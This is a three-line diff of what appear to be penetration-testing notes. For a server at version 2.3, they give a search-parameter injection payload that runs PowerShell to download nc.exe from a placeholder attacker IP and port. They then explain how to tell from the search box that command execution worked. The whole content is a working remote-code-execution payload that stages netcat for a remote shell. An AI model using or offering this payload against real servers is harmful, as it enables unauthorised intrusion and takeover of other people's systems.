@@ -1,0 +1,3 @@
+If version=2.3:
+  ?search=%00{.exec|powershell.exe Invoke-WebRequest "<IP>:<PORT>/nc.exe" -OutFile "nc.exe".}
+    If undisplayable character returned in search box, command execution is a likely thing (even if nc.exe isnt retrieved from our server)
